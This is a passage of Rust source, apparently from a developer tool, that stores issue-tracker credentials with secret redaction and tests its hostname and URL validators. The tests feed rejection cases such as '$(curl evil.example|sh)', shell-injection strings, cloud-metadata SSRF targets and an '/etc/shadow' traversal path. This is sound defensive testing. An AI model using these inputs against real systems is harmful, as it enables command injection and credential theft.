    /// Remove a tracker, its secret and its views. Its items stay (links
    /// and history keep pointing at them) and are marked unavailable with
    /// `tracker_removed`; `trackers.id` is AUTOINCREMENT, so a re-added
    /// tracker never inherits them by accident. `false` when there was none.
    pub fn remove_tracker(&self, id: i64) -> Result<bool, IpcError> {
        let tx = self.conn.unchecked_transaction()?;
        let n = tx.execute("DELETE FROM trackers WHERE id = ?1", rusqlite::params![id])?;
        if n > 0 {
            // FK cascades cover these when foreign keys are on; explicit so a
            // connection with them off cannot keep a secret behind.
            tx.execute(
                "DELETE FROM tracker_secrets WHERE tracker_id = ?1",
                rusqlite::params![id],
            )?;
            tx.execute(
                "DELETE FROM tracker_views WHERE tracker_id = ?1",
                rusqlite::params![id],
            )?;
            tx.execute(
                "UPDATE work_items SET unavailable_at = COALESCE(unavailable_at, ?2), \
                        unavailable_reason = 'tracker_removed' WHERE tracker_id = ?1",
                rusqlite::params![id, now_unix()],
            )?;
        }
        tx.commit()?;
        Ok(n > 0)
    }

    /// Set (or replace) a tracker's credential: exactly one of a stored
    /// `value` or a `credential_ref`. Resets the state to `unconfigured`
    /// until the next test or sync says otherwise.
    pub fn set_tracker_credential(
        &self,
        id: i64,
        auth_kind: &str,
        username: Option<&str>,
        value: Option<&str>,
        credential_ref: Option<&str>,
    ) -> Result<TrackerRow, IpcError> {
        let row = self.require_tracker(id)?;
        if row.transport.starts_with("via_cli:") {
            return Err(IpcError::new(
                codes::E_INVALID,
                format!(
                    "{} is read through a CLI on {} with that host's own login; \
                     fleet stores no credential for it",
                    row.name,
                    row.transport.trim_start_matches("via_cli:")
                ),
            ));
        }
        if !TRACKER_AUTH_KINDS.contains(&auth_kind) {
            return Err(IpcError::new(
                codes::E_INVALID,
                format!(
                    "unknown auth kind {auth_kind:?}; one of {}",
                    TRACKER_AUTH_KINDS.join(", ")
                ),
            ));
        }
        let value = value.map(str::trim).filter(|v| !v.is_empty());
        let credential_ref = credential_ref.map(str::trim).filter(|v| !v.is_empty());
        match (value, credential_ref) {
            (Some(_), None) | (None, Some(_)) => {}
            _ => {
                return Err(IpcError::new(
                    codes::E_INVALID,
                    "pass exactly one of a secret or a credential_ref",
                ))
            }
        }
        if let Some(r) = credential_ref {
            validate_credential_ref(r)?;
        }
        if let Some(v) = value {
            if v.chars().any(char::is_control) {
                return Err(IpcError::new(
                    codes::E_INVALID,
                    "the secret must not contain control characters",
                ));
            }
        }
        let username = username.map(str::trim).filter(|u| !u.is_empty());
        if auth_kind == "basic" && username.is_none() {
            return Err(IpcError::new(
                codes::E_INVALID,
                "basic auth needs a username (the Atlassian account email)",
            ));
        }
        if username.is_some_and(|u| u.chars().any(char::is_control) || u.contains(':')) {
            return Err(IpcError::new(
                codes::E_INVALID,
                "the username must not contain ':' or control characters",
            ));
        }
        let tx = self.conn.unchecked_transaction()?;
        tx.execute(
            "INSERT INTO tracker_secrets (tracker_id, auth_kind, username, value, credential_ref) \
             VALUES (?1, ?2, ?3, ?4, ?5) \
             ON CONFLICT(tracker_id) DO UPDATE SET auth_kind = excluded.auth_kind, \
               username = excluded.username, value = excluded.value, \
               credential_ref = excluded.credential_ref",
            rusqlite::params![id, auth_kind, username, value, credential_ref],
        )?;
        tx.execute(
            "UPDATE trackers SET state = 'unconfigured', last_error = NULL WHERE id = ?1",
            rusqlite::params![id],
        )?;
        tx.commit()?;
        self.require_tracker(id)
    }

    /// THE one place a tracker secret is read. For transport code only; the
    /// result neither serialises nor prints the secret. `Ok(None)` when no
    /// credential is set or none can be read.
    pub fn resolve_tracker_credential(
        &self,
        id: i64,
    ) -> Result<Option<TrackerCredential>, IpcError> {
        /// auth_kind, username, value, credential_ref.
        type SecretRow = (String, Option<String>, Option<String>, Option<String>);
        let row: Option<SecretRow> = self
            .conn
            .query_row(
                "SELECT auth_kind, username, value, credential_ref FROM tracker_secrets \
                 WHERE tracker_id = ?1",
                rusqlite::params![id],
                |r| Ok((r.get(0)?, r.get(1)?, r.get(2)?, r.get(3)?)),
            )
            .optional()?;
        let Some((auth_kind, username, value, credential_ref)) = row else {
            return Ok(None);
        };
        let secret = credential_ref
            .as_deref()
            .and_then(read_credential_ref)
            .or(value);
        Ok(secret.map(|s| TrackerCredential {
            auth_kind,
            username,
            secret: Secret(s),
        }))
    }

    /// Every tracker credential's literal forms, for diagnostics' literal
    /// masking list.
    pub fn tracker_secret_literals(&self) -> Result<Vec<String>, IpcError> {
        let ids: Vec<i64> = {
            let mut stmt = self
                .conn
                .prepare("SELECT tracker_id FROM tracker_secrets")?;
            let rows = stmt.query_map([], |r| r.get(0))?;
            rows.collect::<rusqlite::Result<Vec<_>>>()?
        };
        let mut out = Vec::new();
        for id in ids {
            if let Some(c) = self.resolve_tracker_credential(id)? {
                out.extend(c.literals());
            }
        }
        Ok(out)
    }

    /// Record a tracker's state and error (redacted, capped). `true` when
    /// either changed, so a caller emits only on a real change.
    pub fn set_tracker_state(
        &self,
        id: i64,
        state: &str,
        last_error: Option<&str>,
    ) -> Result<bool, IpcError> {
        let secrets = self
            .resolve_tracker_credential(id)?
            .map(|c| c.literals())
            .unwrap_or_default();
        let err = last_error.map(|e| {
            let masked = crate::logging::redact_secrets(e, &secrets);
            masked
                .chars()
                .take(LAST_ERROR_MAX_CHARS)
                .collect::<String>()
        });
        let n = self.conn.execute(
            "UPDATE trackers SET state = ?1, last_error = ?2 \
             WHERE id = ?3 AND (state IS NOT ?1 OR last_error IS NOT ?2)",
            rusqlite::params![state, err, id],
        )?;
        Ok(n > 0)
    }

    /// Stamp a finished sync pass. `true` for the tracker's FIRST sync —
    /// the one moment worth a `work:tracker` frame on its own (the UI's
    /// retro-link reveal); later stamps are read, not pushed.
    pub fn set_tracker_synced(&self, id: i64, at: i64) -> Result<bool, IpcError> {
        let first: bool = self
            .conn
            .query_row(
                "SELECT last_sync_at IS NULL FROM trackers WHERE id = ?1",
                rusqlite::params![id],
                |r| r.get(0),
            )
            .optional()?
            .unwrap_or(false);
        self.conn.execute(
            "UPDATE trackers SET last_sync_at = ?1 WHERE id = ?2",
            rusqlite::params![at, id],
        )?;
        Ok(first)
    }

    /// Replace what a probe learned. `true` when anything changed.
    pub fn set_tracker_probe(
        &self,
        id: i64,
        instance_id: Option<&str>,
        config: &TrackerConfig,
    ) -> Result<bool, IpcError> {
        let json = serde_json::to_string(config)
            .map_err(|e| IpcError::new(codes::E_SERIALIZE, e.to_string()))?;
        let n = self.conn.execute(
            "UPDATE trackers SET instance_id = COALESCE(?1, instance_id), config = ?2 \
             WHERE id = ?3 AND (instance_id IS NOT COALESCE(?1, instance_id) OR config IS NOT ?2)",
            rusqlite::params![instance_id, json, id],
        )?;
        Ok(n > 0)
    }

    /// Emit `work:tracker` with the row as it now stands (no secret: see
    /// [`TrackerRow`]). Callers emit only after a write that changed it.
    pub fn emit_tracker(&self, id: i64) -> Result<(), IpcError> {
        if let Some(row) = self.get_tracker(id)? {
            self.bus
                .emit(&crate::events::RowChange::TrackerUpdated(row));
        }
        Ok(())
    }

    /// Emit `work:tracker_removed`.
    pub fn emit_tracker_removed(&self, id: i64) {
        self.bus.emit(&crate::events::RowChange::TrackerRemoved(id));
    }

    // --- views --------------------------------------------------------------

    pub fn list_tracker_views(&self, tracker_id: i64) -> Result<Vec<TrackerViewRow>, IpcError> {
        let mut stmt = self.conn.prepare(
            "SELECT tracker_id, view_id, label, query, watermark, enabled, sync_mark \
             FROM tracker_views \
             WHERE tracker_id = ?1 ORDER BY rowid",
        )?;
        let rows = stmt.query_map(rusqlite::params![tracker_id], map_view)?;
        Ok(rows.collect::<rusqlite::Result<Vec<_>>>()?)
    }

    /// Make the tracker's views exactly `views` (id, label, query): new ones
    /// are added, changed ones updated (a changed query drops its
    /// watermark), vanished ones removed. `enabled` and watermarks of the
    /// unchanged survive.
    pub fn sync_tracker_views(
        &self,
        tracker_id: i64,
        views: &[(String, String, String)],
    ) -> Result<(), IpcError> {
        let tx = self.conn.unchecked_transaction()?;
        for (id, label, query) in views {
            tx.execute(
                "INSERT INTO tracker_views (tracker_id, view_id, label, query) \
                 VALUES (?1, ?2, ?3, ?4) \
                 ON CONFLICT(tracker_id, view_id) DO UPDATE SET label = excluded.label, \
                   watermark = CASE WHEN query IS excluded.query THEN watermark END, \
                   sync_mark = CASE WHEN query IS excluded.query THEN sync_mark END, \
                   query = excluded.query",
                rusqlite::params![tracker_id, id, label, query],
            )?;
        }
        let keep: Vec<&str> = views.iter().map(|v| v.0.as_str()).collect();
        let existing: Vec<String> = {
            let mut stmt = tx.prepare("SELECT view_id FROM tracker_views WHERE tracker_id = ?1")?;
            let rows = stmt.query_map(rusqlite::params![tracker_id], |r| r.get(0))?;
            rows.collect::<rusqlite::Result<Vec<_>>>()?
        };
        for v in existing {
            if !keep.contains(&v.as_str()) {
                tx.execute(
                    "DELETE FROM tracker_views WHERE tracker_id = ?1 AND view_id = ?2",
                    rusqlite::params![tracker_id, v],
                )?;
            }
        }
        tx.commit()?;
        Ok(())
    }

    pub fn set_tracker_view_watermark(
        &self,
        tracker_id: i64,
        view_id: &str,
        watermark: i64,
    ) -> Result<(), IpcError> {
        self.conn.execute(
            "UPDATE tracker_views SET watermark = MAX(COALESCE(watermark, 0), ?3) \
             WHERE tracker_id = ?1 AND view_id = ?2",
            rusqlite::params![tracker_id, view_id, watermark],
        )?;
        Ok(())
    }

    /// Store (or clear) a view's sync token.
    pub fn set_tracker_view_mark(
        &self,
        tracker_id: i64,
        view_id: &str,
        mark: Option<&str>,
    ) -> Result<(), IpcError> {
        self.conn.execute(
            "UPDATE tracker_views SET sync_mark = ?3 WHERE tracker_id = ?1 AND view_id = ?2",
            rusqlite::params![tracker_id, view_id, mark],
        )?;
        Ok(())
    }

    /// Replace what the admin set. `true` when it changed.
    pub fn set_tracker_settings(
        &self,
        id: i64,
        settings: &TrackerSettings,
    ) -> Result<bool, IpcError> {
        self.require_tracker(id)?;
        let json = (!settings.is_default())
            .then(|| serde_json::to_string(settings))
            .transpose()
            .map_err(|e| IpcError::new(codes::E_SERIALIZE, e.to_string()))?;
        let n = self.conn.execute(
            "UPDATE trackers SET settings = ?1 WHERE id = ?2 AND settings IS NOT ?1",
            rusqlite::params![json, id],
        )?;
        Ok(n > 0)
    }

    pub fn set_tracker_view_enabled(
        &self,
        tracker_id: i64,
        view_id: &str,
        enabled: bool,
    ) -> Result<bool, IpcError> {
        let n = self.conn.execute(
            "UPDATE tracker_views SET enabled = ?3 \
             WHERE tracker_id = ?1 AND view_id = ?2 AND enabled IS NOT ?3",
            rusqlite::params![tracker_id, view_id, enabled as i64],
        )?;
        Ok(n > 0)
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    const TOKEN: &str = "ATATT3xFfGF0abcdefghijklmnopqrstuvwxyz0123456789-_=WXYZ";

    fn with_tracker() -> (Store, i64) {
        let s = Store::open_in_memory().unwrap();
        let t = s
            .add_tracker("jira", "Acme", "https://acme.atlassian.net/")
            .unwrap();
        (s, t.id)
    }

    /// The GitHub Enterprise hostname fence (M11.4): what reaches `gh
    /// --hostname`, and what never does.
    #[test]
    fn an_enterprise_hostname_is_a_dns_name_and_nothing_else() {
        for (raw, want) in [
            ("ghe.corp.example", "ghe.corp.example"),
            ("GHE.Corp.Example", "ghe.corp.example"),
            ("ghe.corp.example:8443", "ghe.corp.example:8443"),
            ("git-hub.x1.example", "git-hub.x1.example"),
            ("ghe.corp.example:65535", "ghe.corp.example:65535"),
        ] {
            assert_eq!(validate_ghes_hostname(raw).unwrap(), want, "{raw}");
        }
        for bad in [
            "",
            " ghe.corp.example",
            "ghe.corp.example ",
            "ghe corp.example",
            "ghe.corp.example\n",
            "ghe.corp.example\nid",
            "ghe.corp.example\r",
            "ghe.corp.example\0",
            "a;b",
            "a;b.example",
            "$(x)",
            "$(x).example",
            "`id`.example",
            "ghe.example&&id",
            "ghe.example|id",
            "ghe.example'",
            "ghe.example\"",
            "https://ghe.corp.example",
            "ghe.corp.example/api",
            "user@ghe.corp.example",
            "user:pw@ghe.corp.example",
            "ghe.corp.example:",
            "ghe.corp.example:0",
            "ghe.corp.example:08443",
            "ghe.corp.example:65536",
            "ghe.corp.example:84:43",
            "ghe.corp.example:x",
            "localhost",
            "LOCALHOST",
            "localhost:8443",
            "api.localhost",
            "ghe",
            "127.0.0.1",
            "127.0.0.1:443",
            "169.254.169.254",
            "10.0.0.8",
            "0.0.0.0",
            "[::1]",
            "::1",
            "fe80::1",
            "metadata.google.internal",
            "github.com",
            "www.github.com",
            "api.github.com",
            "github.com.evil.example",
            "x.github.com",
            "a.github.com.evil.example",
            "-ghe.example",
            "ghe-.example",
            "ghe..example",
            ".ghe.example",
            "ghe.example.",
            "ghe_corp.example",
            "gh\u{e9}.example",
            "--hostname.example",
        ] {
            let e = validate_ghes_hostname(bad).unwrap_err();
            assert_eq!(e.code, codes::E_INVALID, "{bad:?}");
        }
        assert!(validate_ghes_hostname(&format!("{}.example", "a".repeat(64))).is_err());
        assert!(validate_ghes_hostname(&"a.".repeat(130)).is_err());
    }

    #[test]
    fn a_github_site_may_be_an_enterprise_host_and_the_hostname_is_github_only() {
        for (raw, want) in [
            (
                "https://github.com/Acme/api/issues/4",
                "https://github.com/acme",
            ),
            ("https://ghe.corp.example", "https://ghe.corp.example"),
            (
                "https://GHE.corp.example/Acme/api/issues/4",
                "https://ghe.corp.example/acme",
            ),
        ] {
            assert_eq!(
                normalize_provider_site("github", raw).unwrap(),
                want,
                "{raw}"
            );
        }
        for bad in [
            "https://ghe.corp.example:8443/acme",
            "https://127.0.0.1/acme",
            "https://localhost/acme",
            "https://u@ghe.corp.example/acme",
            "http://ghe.corp.example/acme",
            "https://ghe/acme",
            "https://ghe.corp.example/-x",
        ] {
            assert!(normalize_provider_site("github", bad).is_err(), "{bad}");
        }
        assert_eq!(
            github_site("https://ghe.corp.example/acme"),
            Some((Some("ghe.corp.example".into()), Some("acme".into())))
        );
        assert_eq!(github_site("https://github.com"), Some((None, None)));
        assert_eq!(github_site("https://localhost/acme"), None);
        assert_eq!(github_site("http://ghe.corp.example"), None);
        let with_host = TrackerSettings {
            hostname: Some("GHE.corp.example:8443".into()),
            ..Default::default()
        };
        assert_eq!(
            validate_tracker_settings("github", with_host.clone())
                .unwrap()
                .hostname
                .as_deref(),
            Some("ghe.corp.example:8443")
        );
        for p in ["jira", "jira_dc", "asana", "linear"] {
            assert!(
                validate_tracker_settings(p, with_host.clone()).is_err(),
                "{p}"
            );
        }
        let bad = TrackerSettings {
            hostname: Some("$(curl evil.example|sh)".into()),
            ..Default::default()
        };
        assert!(validate_tracker_settings("github", bad).is_err());
    }

    #[test]
    fn a_github_ref_may_name_an_enterprise_instance() {
        use crate::store::{canonical_key, github_ref, split_github_repo};
        assert_eq!(github_ref("acme/api#42"), Some(("acme/api", 42)));
        assert_eq!(
            github_ref("ghe.corp.example/acme/api#42"),
            Some(("ghe.corp.example/acme/api", 42))
        );
        assert_eq!(
            split_github_repo("ghe.corp.example/acme/api"),
            Some((Some("ghe.corp.example"), "acme/api"))
        );
        assert_eq!(split_github_repo("acme/api"), Some((None, "acme/api")));
        for bad in [
            "localhost/acme/api#1",
            "127.0.0.1/acme/api#1",
            "ghe.corp.example:8443/acme/api#1",
            "a/b/c/d#1",
            "ghe.corp.example/.x/api#1",
            "ghe.corp.example/acme/api#",
            "ghe.corp.example/acme/api#1234567890",
        ] {
            assert_eq!(github_ref(bad), None, "{bad}");
        }
        assert_eq!(
            canonical_key("GHE.Corp.Example/Acme/API#7"),
            "ghe.corp.example/acme/api#7"
        );
        assert!(crate::service::work::recognize::is_work_key(
            "ghe.corp.example/acme/api#7"
        ));
    }

    #[test]
    fn the_site_fence_admits_only_atlassian_cloud_sites() {
        assert_eq!(
            normalize_site_url(" HTTPS://Acme.atlassian.net/ ").unwrap(),
            "https://acme.atlassian.net"
        );
        assert_eq!(
            normalize_site_url("https://my-team2.atlassian.net").unwrap(),
            "https://my-team2.atlassian.net"
        );
        for bad in [
            "http://acme.atlassian.net",
            "https://acme.atlassian.net:8443",
            "https://user:pw@acme.atlassian.net",
            "https://user@acme.atlassian.net",
            "https://acme.atlassian.net/browse/ABC-1",
            "https://acme.atlassian.net/?x=1",
            "https://acme.atlassian.net#x",
            "https://atlassian.net",
            "https://a.b.atlassian.net",
            "https://acme.atlassian.net.evil.com",
            "https://evilatlassian.net",
            "https://169.254.169.254",
            "https://localhost",
            "https://-acme.atlassian.net",
            "ftp://acme.atlassian.net",
            "acme.atlassian.net",
        ] {
            let e = normalize_site_url(bad).unwrap_err();
            assert_eq!(e.code, codes::E_INVALID, "{bad}");
        }
        assert!(is_allowed_tracker_host("acme.atlassian.net"));
        assert!(!is_allowed_tracker_host("acme.atlassian.net.evil.com"));
        assert!(!is_allowed_tracker_host("10.0.0.1"));
    }

    #[test]
    fn a_site_is_added_once_and_unknown_providers_are_refused() {
        let (s, id) = with_tracker();
        let t = s.require_tracker(id).unwrap();
        assert_eq!(
            (t.site_url.as_str(), t.state.as_str(), t.has_credential),
            ("https://acme.atlassian.net", "unconfigured", false)
        );
        assert_eq!(
            s.add_tracker("jira", "Again", "https://ACME.atlassian.net")
                .unwrap_err()
                .code,
            codes::E_EXISTS
        );
        assert_eq!(
            s.add_tracker("linear", "L", "https://x.atlassian.net")
                .unwrap_err()
                .code,
            codes::E_INVALID
        );
        assert_eq!(s.list_trackers().unwrap().len(), 1);
    }

    /// The acceptance test for "no read path serialises a secret": every
    /// row type a read returns, serialised, never contains the token or its
    /// Basic-auth encoding.
    #[test]
    fn no_read_path_serialises_a_secret() {
        let (s, id) = with_tracker();
        s.set_tracker_credential(id, "basic", Some("me@acme.com"), Some(TOKEN), None)
            .unwrap();
        s.sync_tracker_views(id, &[("mine".into(), "My work".into(), "q".into())])
            .unwrap();
        let cred = s.resolve_tracker_credential(id).unwrap().unwrap();
        let literals = cred.literals();
        let row = s.require_tracker(id).unwrap();
        assert!(row.has_credential);
        assert_eq!(row.credential_hint.as_deref(), Some("…WXYZ"));
        let texts = [
            serde_json::to_string(&row).unwrap(),
            serde_json::to_string(&s.list_trackers().unwrap()).unwrap(),
            serde_json::to_string(&s.list_tracker_views(id).unwrap()).unwrap(),
            format!("{row:?}"),
            format!("{cred:?}"),
            format!("{}", cred.secret),
            format!("{:?}", cred.authorization()),
        ];
        for text in texts {
            for lit in &literals {
                assert!(!text.contains(lit.as_str()), "secret leaked into {text}");
            }
        }
        // The one intended exit.
        assert_eq!(cred.secret.expose(), TOKEN);
        assert!(cred.authorization().expose().starts_with("Basic "));
    }

    /// Source guard: the secret types never grow a `Serialize` derive, and
    /// only `resolve_tracker_credential` (plus the row mapper's hint and the
    /// literal list) selects the secret column.
    #[test]
    fn the_secret_types_cannot_serialise() {
        let src = include_str!("trackers.rs");
        let src = &src[..src.find("#[cfg(test)]").unwrap()];
        for ty in ["pub struct Secret(", "pub struct TrackerCredential"] {
            let at = src.find(ty).unwrap();
            let derive = &src[src[..at].rfind("#[derive").unwrap()..at];
            assert!(!derive.contains("Serialize"), "{ty} derives Serialize");
        }
        assert_eq!(
            src.matches("FROM tracker_secrets").count(),
            4,
            "tracker_secrets is read by resolve_tracker_credential, \
             tracker_secret_literals and deleted by remove_tracker and \
             set_tracker_transport (a via_cli tracker holds none) only"
        );
    }

    #[test]
    fn a_reference_wins_over_the_stored_value_and_falls_back_to_it() {
        let (s, id) = with_tracker();
        // A reference only.
        let var = "FLEET_TEST_TRACKER_TOKEN_REF";
        std::env::set_var(var, format!(" {TOKEN}\n"));
        let row = s
            .set_tracker_credential(
                id,
                "basic",
                Some("me@acme.com"),
                None,
                Some(&format!("env:{var}")),
            )
            .unwrap();
        assert_eq!(
            row.credential_hint.as_deref(),
            Some("env:FLEET_TEST_TRACKER_TOKEN_REF")
        );
        let c = s.resolve_tracker_credential(id).unwrap().unwrap();
        assert_eq!(c.secret.expose(), TOKEN, "trimmed");
        // A file reference.
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("jira");
        std::fs::write(&path, "from-file-token-123\n").unwrap();
        s.set_tracker_credential(
            id,
            "basic",
            Some("me@acme.com"),
            None,
            Some(&format!("file:{}", path.display())),
        )
        .unwrap();
        assert_eq!(
            s.resolve_tracker_credential(id)
                .unwrap()
                .unwrap()
                .secret
                .expose(),
            "from-file-token-123"
        );
        // Both set by hand (an operator's SQL, or a future hub): the ref
        // wins while it reads, the value is the fallback.
        s.conn
            .execute(
                "UPDATE tracker_secrets SET value = 'stored-value-1234', \
                 credential_ref = ?1 WHERE tracker_id = ?2",
                rusqlite::params![format!("env:{var}"), id],
            )
            .unwrap();
        assert_eq!(
            s.resolve_tracker_credential(id)
                .unwrap()
                .unwrap()
                .secret
                .expose(),
            TOKEN
        );
        std::env::remove_var(var);
        assert_eq!(
            s.resolve_tracker_credential(id)
                .unwrap()
                .unwrap()
                .secret
                .expose(),
            "stored-value-1234"
        );
        // Unreadable ref and no value: no credential.
        s.conn
            .execute(
                "UPDATE tracker_secrets SET value = NULL WHERE tracker_id = ?1",
                rusqlite::params![id],
            )
            .unwrap();
        assert!(s.resolve_tracker_credential(id).unwrap().is_none());
    }

    #[test]
    fn malformed_credentials_are_refused() {
        let (s, id) = with_tracker();
        for (kind, user, value, r) in [
            ("basic", Some("me@x"), None, None),
            ("basic", Some("me@x"), Some("t"), Some("env:X")),
            ("basic", None, Some("tok"), None),
            ("oauth", Some("me@x"), Some("tok"), None),
            ("basic", Some("a:b"), Some("tok"), None),
            ("basic", Some("me@x"), Some("to\nk"), None),
            ("basic", Some("me@x"), None, Some("env:1BAD")),
            ("basic", Some("me@x"), None, Some("file:relative")),
            ("basic", Some("me@x"), None, Some("file:/run/../etc/shadow")),
            ("basic", Some("me@x"), None, Some("vault:x")),
        ] {
            let e = s
                .set_tracker_credential(id, kind, user, value, r)
                .unwrap_err();
            assert_eq!(e.code, codes::E_INVALID, "{kind} {user:?} {r:?}");
        }
        assert_eq!(
            s.set_tracker_credential(99, "basic", Some("a"), Some("b"), None)
                .unwrap_err()
                .code,
            codes::E_NOTFOUND
        );
    }

    #[test]
    fn last_error_is_redacted_and_state_changes_are_reported_once() {
        let (s, id) = with_tracker();
        s.set_tracker_credential(id, "basic", Some("me@acme.com"), Some(TOKEN), None)
            .unwrap();
        let basic = s
            .resolve_tracker_credential(id)
            .unwrap()
            .unwrap()
            .literals()[1]
            .clone();
        let err = format!("401 for Authorization: Basic {basic} (token {TOKEN}) plain-secret");
        assert!(s.set_tracker_state(id, "auth_failed", Some(&err)).unwrap());
        assert!(!s.set_tracker_state(id, "auth_failed", Some(&err)).unwrap());
        let row = s.require_tracker(id).unwrap();
        let stored = row.last_error.unwrap();
        assert!(
            !stored.contains(TOKEN) && !stored.contains(&basic),
            "{stored}"
        );
        assert!(stored.contains("[REDACTED]"));
        assert!(s.set_tracker_state(id, "ok", None).unwrap());
    }

    #[test]
    fn removing_a_tracker_keeps_its_items_as_unavailable_and_drops_its_secret() {
        let (s, id) = with_tracker();
        s.set_tracker_credential(id, "basic", Some("me@acme.com"), Some(TOKEN), None)
            .unwrap();
        s.conn
            .execute(
                "INSERT INTO work_items (source, tracker_id, external_id, key, title, created_at, updated_at) \
                 VALUES ('jira', ?1, '10001', 'ABC-1', 'x', 1, 1)",
                rusqlite::params![id],
            )
            .unwrap();
        assert!(s.remove_tracker(id).unwrap());
        assert!(!s.remove_tracker(id).unwrap());
        let n: i64 = s
            .conn
            .query_row("SELECT COUNT(*) FROM tracker_secrets", [], |r| r.get(0))
            .unwrap();
        assert_eq!(n, 0);
        let reason: Option<String> = s
            .conn
            .query_row(
                "SELECT unavailable_reason FROM work_items WHERE key = 'ABC-1'",
                [],
                |r| r.get(0),
            )
            .unwrap();
        assert_eq!(reason.as_deref(), Some("tracker_removed"));
        // AUTOINCREMENT: a re-added site gets a fresh id.
        let again = s
            .add_tracker("jira", "Acme", "https://acme.atlassian.net")
            .unwrap();
        assert_ne!(again.id, id);
    }

    #[test]
    fn views_sync_to_the_given_set_and_keep_unchanged_watermarks() {
        let (s, id) = with_tracker();
        let v = |id: &str, q: &str| (id.to_string(), id.to_uppercase(), q.to_string());
        s.sync_tracker_views(id, &[v("mine", "q1"), v("recent", "q2")])
            .unwrap();
        s.set_tracker_view_watermark(id, "mine", 100).unwrap();
        s.set_tracker_view_watermark(id, "mine", 50).unwrap();
        s.set_tracker_view_watermark(id, "recent", 70).unwrap();
        s.sync_tracker_views(
            id,
            &[
                v("mine", "q1"),
                v("recent", "q2-changed"),
                v("filter:9", "q3"),
            ],
        )
        .unwrap();
        let views = s.list_tracker_views(id).unwrap();
        let wm: Vec<(&str, Option<i64>)> = views
            .iter()
            .map(|v| (v.view_id.as_str(), v.watermark))
            .collect();
        assert_eq!(
            wm,
            vec![("mine", Some(100)), ("recent", None), ("filter:9", None)]
        );
        assert!(s.set_tracker_view_enabled(id, "mine", false).unwrap());
        assert!(!s.set_tracker_view_enabled(id, "mine", false).unwrap());
        s.sync_tracker_views(id, &[v("mine", "q1")]).unwrap();
        let views = s.list_tracker_views(id).unwrap();
        assert_eq!(views.len(), 1);
        assert!(!views[0].enabled, "enabled survives a sync");
    }

    #[test]
    fn a_probe_is_stored_and_reported_only_when_it_changes() {
        let (s, id) = with_tracker();
        let cfg = TrackerConfig {
            account_id: Some("5b10".into()),
            key_prefixes: vec!["ABC".into()],
            ..Default::default()
        };
        assert!(s.set_tracker_probe(id, Some("cloud-1"), &cfg).unwrap());
        assert!(!s.set_tracker_probe(id, Some("cloud-1"), &cfg).unwrap());
        let row = s.require_tracker(id).unwrap();
        assert_eq!(row.config, cfg);
        assert_eq!(row.instance_id.as_deref(), Some("cloud-1"));
        // An unknown field from a newer hub is ignored, not fatal.
        s.conn
            .execute(
                "UPDATE trackers SET config = '{\"key_prefixes\":[\"X\"],\"future\":1}' WHERE id = ?1",
                rusqlite::params![id],
            )
            .unwrap();
        assert_eq!(
            s.require_tracker(id).unwrap().config.key_prefixes,
            vec!["X"]
        );
    }
}
